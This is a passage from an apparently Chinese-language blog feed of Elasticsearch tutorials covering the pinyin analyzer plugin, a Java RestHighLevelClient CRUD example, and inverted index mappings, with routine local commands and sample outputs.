    <content type="text"><![CDATA[Elastic的Medcl提供了一种搜索Pinyin搜索的方法。拼音搜索在很多的应用场景中都有被用到。比如在百度搜索中，我们使用拼音就可以出现汉字：对于我们中国人来说，拼音搜索也是非常直接的。那么在Elasticsearch中我们该如何使用pinyin来进行搜索呢？答案是我们采用Medcl所创建的elasticsearch-analysis-pinyin分析器。下面我们简单介绍一下如何进行安装和测试。下载Pinyin分析器源码进行编译及安装由于elasticsearch-analysis-pinyin目前没有可以下载的可以安装的发布文件，我们必须自己下载源码，并编译。首先，我们可以通过如下的命名来进行下载：1$ git clone https://github.com/medcl/elasticsearch-analysis-pinyin下载源码后，进入到项目的根目录。整个项目的源码显示为：12345678910$ tree -L 2.├── LICENSE.txt├── README.md├── lib│ └── nlp-lang-1.7.jar├── pom.xml└── src ├── main └── test这样在我们的电脑里就会发现下载好的elasticsearch-analysis-pinyin源码。在进行编译之前，我们必须修改一下我们的版本号以便和我们的Elasticsearch的版本号是一致的。否则我们的plugin将不会被正确装载。我们已知我们的Elasticsearch版本号码是7.3.0，那么我们修改我们的pom.xml文件：在我们的电脑上必须安装好Maven。然后进入项目的根目录，并在命令行中打入如下的命令：1$ mvn install这样整个项目的编译工作就完成了。我们在命令行中打入如下的命令：12$ find ./ -name &quot;*.zip&quot;.//target/releases/elasticsearch-analysis-pinyin-7.3.0.zip它显示在tagert目录下已经生产了一个叫做elasticsearch-analysis-pinyin-7.3.0.zip的压缩文件。这个版本号码刚好和我们的Elasticsearch的版本是一样的。我们到Elasticsearch的安装目录下的plugin目录下创建一个叫做pinyin的子目录：123/Users/liuxg/elastic/elasticsearch-7.3.0/pluginslocalhost:plugins liuxg$ ls analysis-ik pinyin然后，把我们刚才在上一步生产的elasticsearch-analysis-pinyin-7.0.0.zip文件进行解压，并把文件放入到我们刚才创建的pinyin目录下。这样整个pinyin文件夹的文件显示如下：1234567$ lsanalysis-ik pinyinlocalhost:plugins liuxg$ tree pinyin/ -L 3pinyin/├── elasticsearch-analysis-pinyin-7.3.0.jar├── nlp-lang-1.7.jar└── plugin-descriptor.properties至此，我们的安装工作已经完成，我需要重新启动我们的Elasticsearch。测试Pinyin analyzer下面我们来测试一下我们已经安装好的Pinyin分词器是否已经工作。我们可以仿照https://github.com/medcl/elasticsearch-analysis-pinyin上面的介绍来做一些简单的测试：创建一个定制的pinyin分词器1234567891011121314151617181920212223PUT /medcl/ &#123; &quot;settings&quot; : &#123; &quot;analysis&quot; : &#123; &quot;analyzer&quot; : &#123; &quot;pinyin_analyzer&quot; : &#123; &quot;tokenizer&quot; : &quot;my_pinyin&quot; &#125; &#125;, &quot;tokenizer&quot; : &#123; &quot;my_pinyin&quot; : &#123; &quot;type&quot; : &quot;pinyin&quot;, &quot;keep_separate_first_letter&quot; : false, &quot;keep_full_pinyin&quot; : true, &quot;keep_original&quot; : true, &quot;limit_first_letter_length&quot; : 16, &quot;lowercase&quot; : true, &quot;remove_duplicated_term&quot; : true &#125; &#125; &#125; &#125;&#125;测试一些中文汉字12345678910111213141516171819202122232425262728293031323334353637383940414243444546GET /medcl/_analyze&#123; &quot;text&quot;: [&quot;天安门&quot;], &quot;analyzer&quot;: &quot;pinyin_analyzer&quot;&#125;# 显示结果为：&#123; &quot;tokens&quot; : [ &#123; &quot;token&quot; : &quot;tian&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 0, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;天安门&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 0, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;tam&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 0, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;an&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 0, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 1 &#125;, &#123; &quot;token&quot; : &quot;men&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 0, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 2 &#125; ]&#125;上面的token显示，如果我们打入搜索tam是完全可以搜索到我们的结果的。创建mapping1234567891011121314151617POST /medcl/_mapping&#123; &quot;properties&quot;: &#123; &quot;name&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;fields&quot;: &#123; &quot;pinyin&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;store&quot;: false, &quot;term_vector&quot;: &quot;with_offsets&quot;, &quot;analyzer&quot;: &quot;pinyin_analyzer&quot;, &quot;boost&quot;: 10 &#125; &#125; &#125; &#125;&#125;Index文档12POST /medcl/_create/andy&#123;&quot;name&quot;:&quot;刘德华&quot;&#125;搜索文档12345curl http://localhost:9200/medcl/_search?q=name:%E5%88%98%E5%BE%B7%E5%8D%8Ecurl http://localhost:9200/medcl/_search?q=name.pinyin:%e5%88%98%e5%be%b7curl http://localhost:9200/medcl/_search?q=name.pinyin:liucurl http://localhost:9200/medcl/_search?q=name.pinyin:ldhcurl http://localhost:9200/medcl/_search?q=name.pinyin:de+hua或者：12345GET medcl/_search?q=name:%E5%88%98%E5%BE%B7%E5%8D%8EGET medcl/_search?q=name.pinyin:%e5%88%98%e5%be%b7GET medcl/_search?q=name.pinyin:liuGET medcl/_search?q=name.pinyin:ldhGET medcl/_search?q=name.pinyin:de+hua上面的第一个Unicode是“刘德华”，第二个是“刘德”。使用pinyin-tokenFilter1234567891011121314151617181920212223242526PUT /medcl1/ &#123; &quot;settings&quot; : &#123; &quot;analysis&quot; : &#123; &quot;analyzer&quot; : &#123; &quot;user_name_analyzer&quot; : &#123; &quot;tokenizer&quot; : &quot;whitespace&quot;, &quot;filter&quot; : &quot;pinyin_first_letter_and_full_pinyin_filter&quot; &#125; &#125;, &quot;filter&quot; : &#123; &quot;pinyin_first_letter_and_full_pinyin_filter&quot; : &#123; &quot;type&quot; : &quot;pinyin&quot;, &quot;keep_first_letter&quot; : true, &quot;keep_full_pinyin&quot; : false, &quot;keep_none_chinese&quot; : true, &quot;keep_original&quot; : false, &quot;limit_first_letter_length&quot; : 16, &quot;lowercase&quot; : true, &quot;trim_whitespace&quot; : true, &quot;keep_none_chinese_in_first_letter&quot; : true &#125; &#125; &#125; &#125;&#125;Token Test:刘德华 张学友 郭富城 黎明 四大天王12345GET /medcl1/_analyze&#123; &quot;text&quot;: [&quot;刘德华 张学友 郭富城 黎明 四大天王&quot;], &quot;analyzer&quot;: &quot;user_name_analyzer&quot;&#125;12345678910111213141516171819202122232425262728293031323334353637383940&#123; &quot;tokens&quot; : [ &#123; &quot;token&quot; : &quot;ldh&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 3, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;zxy&quot;, &quot;start_offset&quot; : 4, &quot;end_offset&quot; : 7, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 1 &#125;, &#123; &quot;token&quot; : &quot;gfc&quot;, &quot;start_offset&quot; : 8, &quot;end_offset&quot; : 11, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 2 &#125;, &#123; &quot;token&quot; : &quot;lm&quot;, &quot;start_offset&quot; : 12, &quot;end_offset&quot; : 14, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 3 &#125;, &#123; &quot;token&quot; : &quot;sdtw&quot;, &quot;start_offset&quot; : 15, &quot;end_offset&quot; : 19, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 4 &#125; ]&#125;其它请参阅链接https://github.com/medcl/elasticsearch-analysis-pinyin。如果想了解中文IK分词器，请参阅文章“Elasticsearch：IK中文分词器”。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：Java 运用示例]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9AJava%20%E8%BF%90%E7%94%A8%E7%A4%BA%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[在今天的文章中，我们来介绍如何使用Java来访问Elasticsearch。首先，我们必须在我们的系统中安装Elasticsearch。Maven 配置针对Java的开发，我们必须在pom.xml中配置相应的Elasticsearch的信息。Mavev dependency定义如下：12345&lt;dependency&gt; &lt;groupId&gt;org.elasticsearch&lt;/groupId&gt; &lt;artifactId&gt;elasticsearch&lt;/artifactId&gt; &lt;version&gt;7.3.1&lt;/version&gt;&lt;/dependency&gt;这也是目前截止最新的Elasticsearch的版本。您可以随时使用之前提供的链接查看Maven Central托管的最新版本。完成数据库的查询建立一个简单的model1234567891011121314151617181920212223242526272829303132333435363738package com.javacodegeeks.example; public class Person &#123; private String personId; private String name; private String number; public String getNumber() &#123; return number; &#125; public void setNumber(String number) &#123; this.number = number; &#125; public String getPersonId() &#123; return personId; &#125; public void setPersonId(String personId) &#123; this.personId = personId; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; @Override public String toString() &#123; return String.format(&quot;Person&#123;personId=&apos;%s&apos;, name=&apos;%s&apos;, number=&apos;%s&#125;&quot;, personId, name, number); &#125;&#125;在这里，我们定义了一个简单的Person Model。定义连接参数我们将使用默认连接参数与Elasticsearch建立连接。 默认情况下，ES使用两个端口：9200和920112345678910private static final String HOST = &quot;localhost&quot;;private static final int PORT_ONE = 9200;private static final int PORT_TWO = 9201;private static final String SCHEME = &quot;http&quot;; private static RestHighLevelClient restHighLevelClient;private static ObjectMapper objectMapper = new ObjectMapper(); private static final String INDEX = &quot;persondata&quot;;private static final String TYPE = &quot;_doc&quot;;这里我们定义了一个叫做persondata的index，它的type是_doc。在最新的版本中，每个index只支持一个type。如上面参数中所述，Elasticsearch使用两个端口9200和9201.第一个端口9200由Elasticsearch查询服务器使用，我们可以使用它通过RESTful API直接查询数据库。 第二个端口9201由REST服务器使用，外部客户端可以使用该端口连接并执行操作。建立一个连接我们将创建一个与Elasticsearch数据库建立连接的方法。 在建立与数据库的连接时，我们必须提供两个端口，因为只有这样，我们的应用程序才能连接到Elasticsearch服务器，我们将能够执行数据库操作。 以下是建立连接的代码。1234567891011private static synchronized RestHighLevelClient makeConnection() &#123; if(restHighLevelClient == null) &#123; restHighLevelClient = new RestHighLevelClient( RestClient.builder( new HttpHost(HOST, PORT_ONE, SCHEME), new HttpHost(HOST, PORT_TWO, SCHEME))); &#125; return restHighLevelClient;&#125;在这里，我们建立一个RestHighLevelClient的实例。具体的参数，可以参官方文档 Java High Level REST Client (https://www.elastic.co/guide/en/elasticsearch/client/java-rest/7.3/java-rest-high.html)。请注意，我们在此处实现了Singleton Design模式，因此不会为ES创建多个连接，从而节省大量内存。由于存在RestHighLevelClient，与Elasticsearch的连接是线程安全的。 初始化此连接的最佳时间是应用程序请求或向客户端发出第一个请求时。 初始化此连接客户端后，可以使用它来执行任何支持的API。关掉一个连接就像在早期版本的Elasticsearch中一样，我们使用TransportClient，一旦完成查询就关闭它，一旦数据库交互完成RestHighLevelClient，也需要关闭连接。 以下是如何做到这一点：1234private static synchronized void closeConnection() throws IOException &#123; restHighLevelClient.close(); restHighLevelClient = null;&#125;我们还为RestHighLevelClient对象分配了null，以便Singleton模式可以保持一致。插入一个文档我们可以通过将键和值转换为HashMap将数据插入数据库。 ES数据库仅接受HashMap形式的值。 让我们看看如何实现这一目标的代码片段：123456789101112131415161718192021222324252627282930313233343536373839private static Person insertPerson(Person person) &#123; person.setPersonId(UUID.randomUUID().toString()); Map&lt;String, Object&gt; dataMap = new HashMap&lt;String, Object&gt;(); dataMap.put(&quot;name&quot;, person.getName()); dataMap.put(&quot;number&quot;, person.getNumber()); IndexRequest indexRequest = new IndexRequest(INDEX) .id(person.getPersonId()).source(dataMap); try &#123; IndexResponse response = restHighLevelClient.index(indexRequest, RequestOptions.DEFAULT); &#125; catch(ElasticsearchException e) &#123; e.getDetailedMessage(); &#125; catch (java.io.IOException ex)&#123; ex.getLocalizedMessage(); &#125; /* // The following is another way to do it // More information https://www.elastic.co/guide/en/elasticsearch/client/java-rest/7.3/java-rest-high-document-index.html String id = UUID.randomUUID().toString(); person.setPersonId(id); IndexRequest request = new IndexRequest(INDEX); request.id(id); String jsonString = &quot;&#123;&quot; + &quot;\&quot;name\&quot;:&quot; + &quot;\&quot;&quot; + person.getName() + &quot;\&quot;&quot; + &quot;&#125;&quot;; System.out.println(&quot;jsonString: &quot; + jsonString); request.source(jsonString, XContentType.JSON); try &#123; IndexResponse response = restHighLevelClient.index(request, RequestOptions.DEFAULT); &#125; catch(ElasticsearchException e) &#123; e.getDetailedMessage(); &#125; catch (java.io.IOException ex)&#123; ex.getLocalizedMessage(); &#125; */ return person; &#125;就像上面代码中注释的那样。注释的代码的那一部分是另外一种方法。大家可以参照链接(https://www.elastic.co/guide/en/elasticsearch/client/java-rest/7.3/java-rest-high-document-index.html)获得更多的信息。上面，我们使用Java的UUID类来创建对象的唯一标识符。 这样，我们就可以控制对象标识符的制作方式。我们其实也可以固定一个id去写。如果是这样的话，运行多次，只会更新之前的数据，并且version会自动每次运行后增加1。请求上面存入的文档完成将数据插入数据库后，我们可以通过向Elasticsearch数据库服务器发出GET请求来确认操作。 让我们看看如何完成此操作的代码片段：1234567891011121314 private static Person getPersonById(String id)&#123; GetRequest getPersonRequest = new GetRequest(INDEX, id); GetResponse getResponse = null; try &#123; getResponse = restHighLevelClient.get(getPersonRequest, RequestOptions.DEFAULT); &#125; catch (java.io.IOException e)&#123; e.getLocalizedMessage(); &#125; return getResponse != null ? objectMapper.convertValue(getResponse.getSourceAsMap(), Person.class) : null; &#125;在这里，我们根据上面返回来得id来进行query，并返回数据。在这个查询中，我们只提供了可以识别它的对象的主要信息，即索引，和它的唯一标识符id。 此外，我们得到的实际上是一个值的映射。更新文档我们可以通过首先使用其索引，类型和唯一标识符来标识资源，从而轻松地向Elasticsearch发出更新请求。 然后我们可以使用新的HashMap对象来更新Object中的任意数量的值。 这是一个示例代码段：1234567891011121314151617private static Person updatePersonById(String id, Person person)&#123; UpdateRequest updateRequest = new UpdateRequest(INDEX, id) .fetchSource(true); // Fetch Object after its update try &#123; String personJson = objectMapper.writeValueAsString(person); updateRequest.doc(personJson, XContentType.JSON); UpdateResponse updateResponse = restHighLevelClient.update(updateRequest, RequestOptions.DEFAULT); return objectMapper.convertValue(updateResponse.getGetResult().sourceAsMap(), Person.class); &#125;catch (JsonProcessingException e)&#123; e.getMessage(); &#125; catch (java.io.IOException e)&#123; e.getLocalizedMessage(); &#125; System.out.println(&quot;Unable to update person&quot;); return null; &#125;删除文档最后，我们可以通过简单地使用其索引，类型和唯一标识符来标识资源来删除数据。 让我们看一下如何完成此操作的代码片段12345678private static void deletePersonById(String id) &#123; DeleteRequest deleteRequest = new DeleteRequest(INDEX, TYPE, id); try &#123; DeleteResponse deleteResponse = restHighLevelClient.delete(deleteRequest, RequestOptions.DEFAULT); &#125; catch (java.io.IOException e) &#123; e.getLocalizedMessage(); &#125;&#125;我们根据传入的id来删除相应的文档。当然我们也可以做查询删除。运行我们的应用让我们通过执行上面提到的所有操作来尝试我们的应用程序。 由于这是一个普通的Java应用程序，我们将调用这些方法中的每一个并打印操作结果：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public static void main(String[] args) throws IOException &#123; makeConnection(); Person person = new Person(); person.setName(&quot;张三&quot;); System.out.println(&quot;Inserting a new Person with name &quot; + person.getName()); person.setNumber(&quot;111111&quot;); person = insertPerson(person); System.out.println(&quot;Person inserted --&gt; &quot; + person); person = new Person(); person.setName(&quot;姚明&quot;); System.out.println(&quot;Inserting a new Person with name &quot; + person.getName()); person.setNumber(&quot;222222&quot;); person = insertPerson(person); System.out.println(&quot;Person inserted --&gt; &quot; + person); person.setName(&quot;李四&quot;); System.out.println(&quot;Changing name to &quot; + person.getName()); updatePersonById(person.getPersonId(), person); System.out.println(&quot;Person updated --&gt; &quot; + person); System.out.println(&quot;Searching for all documents&quot;); SearchResponse response = searchAll(); System.out.println(response); System.out.println(&quot;Searching for a term&quot;); response = searchTerm(); System.out.println(response); System.out.println(&quot;Match a query&quot;); response = matchQuery(); System.out.println(response); System.out.println(&quot;Getting 李四&quot;); Person personFromDB = getPersonById(person.getPersonId()); System.out.println(&quot;Person from DB --&gt; &quot; + personFromDB); System.out.println(&quot;Deleting &quot; + person.getName()); deletePersonById(personFromDB.getPersonId()); System.out.println(&quot;Person &quot; + person.getName() + &quot; deleted!&quot;); closeConnection(); &#125;运行的结果如下：1234567891011121314Inserting a new Person with name 张三Person inserted --&gt; Person&#123;personId=&apos;33f4162e-0a68-4e66-8717-851516272185&apos;, name=&apos;张三&apos;, number=&apos;111111&#125;Inserting a new Person with name 姚明Person inserted --&gt; Person&#123;personId=&apos;9b477529-6e79-42e8-a50a-21b2d8bc4c13&apos;, name=&apos;姚明&apos;, number=&apos;222222&#125;Changing name to 李四Person updated --&gt; Person&#123;personId=&apos;9b477529-6e79-42e8-a50a-21b2d8bc4c13&apos;, name=&apos;李四&apos;, number=&apos;222222&#125;Searching for all documents&#123;&quot;took&quot;:0,&quot;timed_out&quot;:false,&quot;_shards&quot;:&#123;&quot;total&quot;:1,&quot;successful&quot;:1,&quot;skipped&quot;:0,&quot;failed&quot;:0&#125;,&quot;hits&quot;:&#123;&quot;total&quot;:&#123;&quot;value&quot;:4,&quot;relation&quot;:&quot;eq&quot;&#125;,&quot;max_score&quot;:1.0,&quot;hits&quot;:[&#123;&quot;_index&quot;:&quot;persondata&quot;,&quot;_type&quot;:&quot;_doc&quot;,&quot;_id&quot;:&quot;52425a44-dc06-49ca-b3df-26a8b341391c&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:&#123;&quot;number&quot;:&quot;111111&quot;,&quot;name&quot;:&quot;张三&quot;&#125;&#125;,&#123;&quot;_index&quot;:&quot;persondata&quot;,&quot;_type&quot;:&quot;_doc&quot;,&quot;_id&quot;:&quot;c76b8670-ed00-4212-b47b-46bc85d588b6&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:&#123;&quot;number&quot;:&quot;111111&quot;,&quot;name&quot;:&quot;张三&quot;&#125;&#125;,&#123;&quot;_index&quot;:&quot;persondata&quot;,&quot;_type&quot;:&quot;_doc&quot;,&quot;_id&quot;:&quot;b8bf0466-0ea5-43e0-8188-c0712812fb9a&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:&#123;&quot;number&quot;:&quot;111111&quot;,&quot;name&quot;:&quot;张三&quot;&#125;&#125;,&#123;&quot;_index&quot;:&quot;persondata&quot;,&quot;_type&quot;:&quot;_doc&quot;,&quot;_id&quot;:&quot;468dabe4-8f50-4667-a165-9ce6e015cb76&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:&#123;&quot;number&quot;:&quot;222222&quot;,&quot;name&quot;:&quot;李四&quot;,&quot;personId&quot;:&quot;468dabe4-8f50-4667-a165-9ce6e015cb76&quot;&#125;&#125;]&#125;&#125;Searching for a term&#123;&quot;took&quot;:0,&quot;timed_out&quot;:false,&quot;_shards&quot;:&#123;&quot;total&quot;:1,&quot;successful&quot;:1,&quot;skipped&quot;:0,&quot;failed&quot;:0&#125;,&quot;hits&quot;:&#123;&quot;total&quot;:&#123;&quot;value&quot;:3,&quot;relation&quot;:&quot;eq&quot;&#125;,&quot;max_score&quot;:0.9444616,&quot;hits&quot;:[&#123;&quot;_index&quot;:&quot;persondata&quot;,&quot;_type&quot;:&quot;_doc&quot;,&quot;_id&quot;:&quot;52425a44-dc06-49ca-b3df-26a8b341391c&quot;,&quot;_score&quot;:0.9444616,&quot;_source&quot;:&#123;&quot;number&quot;:&quot;111111&quot;,&quot;name&quot;:&quot;张三&quot;&#125;&#125;,&#123;&quot;_index&quot;:&quot;persondata&quot;,&quot;_type&quot;:&quot;_doc&quot;,&quot;_id&quot;:&quot;c76b8670-ed00-4212-b47b-46bc85d588b6&quot;,&quot;_score&quot;:0.9444616,&quot;_source&quot;:&#123;&quot;number&quot;:&quot;111111&quot;,&quot;name&quot;:&quot;张三&quot;&#125;&#125;,&#123;&quot;_index&quot;:&quot;persondata&quot;,&quot;_type&quot;:&quot;_doc&quot;,&quot;_id&quot;:&quot;b8bf0466-0ea5-43e0-8188-c0712812fb9a&quot;,&quot;_score&quot;:0.9444616,&quot;_source&quot;:&#123;&quot;number&quot;:&quot;111111&quot;,&quot;name&quot;:&quot;张三&quot;&#125;&#125;]&#125;&#125;Match a query&#123;&quot;took&quot;:0,&quot;timed_out&quot;:false,&quot;_shards&quot;:&#123;&quot;total&quot;:1,&quot;successful&quot;:1,&quot;skipped&quot;:0,&quot;failed&quot;:0&#125;,&quot;hits&quot;:&#123;&quot;total&quot;:&#123;&quot;value&quot;:3,&quot;relation&quot;:&quot;eq&quot;&#125;,&quot;max_score&quot;:1.8889232,&quot;hits&quot;:[&#123;&quot;_index&quot;:&quot;persondata&quot;,&quot;_type&quot;:&quot;_doc&quot;,&quot;_id&quot;:&quot;52425a44-dc06-49ca-b3df-26a8b341391c&quot;,&quot;_score&quot;:1.8889232,&quot;_source&quot;:&#123;&quot;number&quot;:&quot;111111&quot;,&quot;name&quot;:&quot;张三&quot;&#125;&#125;,&#123;&quot;_index&quot;:&quot;persondata&quot;,&quot;_type&quot;:&quot;_doc&quot;,&quot;_id&quot;:&quot;c76b8670-ed00-4212-b47b-46bc85d588b6&quot;,&quot;_score&quot;:1.8889232,&quot;_source&quot;:&#123;&quot;number&quot;:&quot;111111&quot;,&quot;name&quot;:&quot;张三&quot;&#125;&#125;,&#123;&quot;_index&quot;:&quot;persondata&quot;,&quot;_type&quot;:&quot;_doc&quot;,&quot;_id&quot;:&quot;b8bf0466-0ea5-43e0-8188-c0712812fb9a&quot;,&quot;_score&quot;:1.8889232,&quot;_source&quot;:&#123;&quot;number&quot;:&quot;111111&quot;,&quot;name&quot;:&quot;张三&quot;&#125;&#125;]&#125;&#125;Getting 李四Person from DB --&gt; Person&#123;personId=&apos;9b477529-6e79-42e8-a50a-21b2d8bc4c13&apos;, name=&apos;李四&apos;, number=&apos;222222&#125;整个项目的源码可以在地址找到：https://github.com/liu-xiao-guo/elastic-java更多资料：【1】使用RestHighLevelClient时单个索引速度很慢(https://discuss.elastic.co/t/resthighlevelclient/170293)]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：inverted index，doc_values及source]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9Ainverted%20index%EF%BC%8Cdoc_values%E5%8F%8Asource%2F</url>
    <content type="text"><![CDATA[当我们学习Elasticsearch时，经常会遇到如下的几个概念：Reverted indexdoc_valuessource？这个几个概念分别指的是什么？有什么用处？如何配置它们？只有我们熟练地掌握了这些概念，我们才可以正确地使用它们。Inverted indexinverted index（反向索引）是Elasticsearch和任何其他支持全文搜索的系统的核心数据结构。 反向索引类似于您在任何书籍结尾处看到的索引。 它将出现在文档中的术语映射到文档。例如，您可以从以下字符串构建反向索引：Elasticsearch从已建立索引的三个文档中构建数据结构。 以下数据结构称为反向索引(inverted index)：Term Frequency Document (postings)choice 1 3day 1 2is 3 1,2,3it 1 1last 1 2of 1 2of 1 2sunday 2 1,2the 3 2,3tomorrow 1 1week 1 2yours 1 3在这里反向索引指的的是，我们根据term来寻找相应的文档ids。这和常规的根据文档id来寻找term相反。请注意以下几点：删除标点符号并将其小写后，文档会按术语进行细分。术语按字母顺序排序“Frequency”列捕获该术语在整个文档集中出现的次数第三列捕获了在其中找到该术语的文档。 此外，它还可能包含找到该术语的确切位置（文档中的偏移）在文档中搜索术语时，查找给定术语出现在其中的文档非常快捷。 如果用户搜索术语“sunday”，那么从“Term”列中查找sunday将非常快，因为这些术语在索引中进行了排序。 即使有数百万个术语，也可以在对术语进行排序时快速查找它们。随后，考虑一种情况，其中用户搜索两个单词，例如last sunday。 反向索引可用于分别搜索last和sunday的发生； 文档2包含这两个术语，因此比仅包含一个术语的文档1更好。反向索引是执行快速搜索的基础。 同样，很容易查明索引中出现了多少次术语。 这是一个简单的计数汇总。 当然，Elasticsearch在我们在这里解释的简单的反向排索引的基础上使用了很多创新。 它兼顾搜索和分析。默认情况下，Elasticsearch在文档中的所有字段上构建一个反向索引，指向该字段所在的Elasticsearch文档。也就是说在每个Elasticsearch的Lucene里，有一个位置存放这个inverted index。在Kibana中，我们建立一个如下的文档：12345678910111213141516171819202122PUT twitter/_doc/1&#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;name&quot;: &#123; &quot;firstname&quot;: &quot;三&quot;, &quot;surname&quot;: &quot;张&quot; &#125;, &quot;address&quot; : [ &quot;中国北京市海淀区&quot;, &quot;中关村29号&quot; ], &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125;&#125;当这个文档被建立好以后，Elastic就已经帮我们建立好了相应的inverted index供我们进行搜索，比如：12345678GET twitter/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;user&quot;: &quot;张三&quot; &#125; &#125;&#125;我们可与得到相应的搜索结果：12345678910111213141516171819202122232425262728293031323334353637383940414243444546&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.5753642, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.5753642, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;name&quot; : &#123; &quot;firstname&quot; : &quot;三&quot;, &quot;surname&quot; : &quot;张&quot; &#125;, &quot;address&quot; : [ &quot;中国北京市海淀区&quot;, &quot;中关村29号&quot; ], &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125; &#125; ] &#125;&#125;如果我们想不让我们的某个字段不被搜索，也就是说不想为这个字段建立inverted index，那么我们可以这么做：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125DELETE twitterPUT twitter&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;city&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125;, &quot;address&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;age&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125;, &quot;country&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;location&quot;: &#123; &quot;properties&quot;: &#123; &quot;lat&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;lon&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125; &#125; &#125;, &quot;message&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;name&quot;: &#123; &quot;properties&quot;: &#123; &quot;firstname&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;surname&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125; &#125; &#125;, &quot;province&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;uid&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125;, &quot;user&quot;: &#123; &quot;type&quot;: &quot;object&quot;, &quot;enabled&quot;: false &#125; &#125; &#125;&#125; PUT twitter/_doc/1&#123; &quot;user&quot; : 